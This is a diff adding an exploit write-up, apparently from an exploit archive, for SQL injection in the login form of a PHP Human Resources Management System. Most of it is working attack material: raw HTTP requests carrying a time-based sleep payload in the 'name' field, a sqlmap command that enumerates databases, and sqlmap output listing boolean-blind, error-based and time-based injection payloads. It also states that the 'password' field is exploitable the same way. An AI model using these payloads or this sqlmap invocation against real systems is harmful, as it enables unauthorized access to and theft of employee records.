@@ -1,0 +1,76 @@
+id: 38267
+date: 03/16/2023
+title: Human Resources Management System - Multiple SQL injection Vulnerability
+author: caesar
+cves: 
+
+## Request PoC
+```
+POST /hrm/controller/login.php HTTP/1.1
+Host: 192.168.1.103
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en-US;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
+Connection: close
+Cache-Control: max-age=0
+Referer: http://192.168.1.103/hrm/
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 73
+
+name=test@testdomain.com'&password=test&submit=Sign+In
+
+```
+
+This request causes an error. Adding "'%2b(select*from(select(sleep(20)))a)%2b'" to the end of "name" parameter, the response to request was 302 status code with message of Found, but 20 seconds later, which indicates that our sleep 20 command works. 
+
+```
+POST /hrm/controller/login.php HTTP/1.1
+Host: 192.168.1.103
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en-US;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
+Connection: close
+Cache-Control: max-age=0
+Referer: http://192.168.1.103/hrm/
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 114
+
+name=test@testdomain.com'%2b(select*from(select(sleep(20)))a)%2b'&password=test&submit=Sign+In
+
+```
+
+## Exploit with sqlmap
+Save the request from burp to file 
+```
+┌──(root㉿caesar)-[/home/kali/Workstation/hrm]
+└─# sqlmap -r sqli.txt -p 'name' --batch --dbs --level=3 --risk=2
+---snip----
+[15:49:36] [INFO] testing 'MySQL UNION query (89) - 81 to 100 columns'
+POST parameter 'name' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 838 HTTP(s) requests:
+---
+Parameter: name (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
+    Payload: name=yObMAVRY@burpcollaborator.net' AND 3287=(SELECT (CASE WHEN (3287=3287) THEN 3287 ELSE (SELECT 8737 UNION SELECT 2671) END))-- -&password=a5P!s3v!K8&submit=Sign In
+
+    Type: error-based
+    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: name=yObMAVRY@burpcollaborator.net' OR (SELECT 6958 FROM(SELECT COUNT(*),CONCAT(0x717a766b71,(SELECT (ELT(6958=6958,1))),0x716b786271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- VHwA&password=a5P!s3v!K8&submit=Sign In
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: name=yObMAVRY@burpcollaborator.net' AND (SELECT 1760 FROM (SELECT(SLEEP(5)))LTmV)-- fhJt&password=a5P!s3v!K8&submit=Sign In
+---
+[15:49:36] [INFO] the back-end DBMS is MySQL
+web application technology: PHP 8.2.0, Apache 2.4.54, PHP
+----snip----
+
+```
+
+
+## The "password" parameter in the POST request is also vulnerable. It can be exploited in the same way.
+
+#  0day.today [2023-03-27]  #
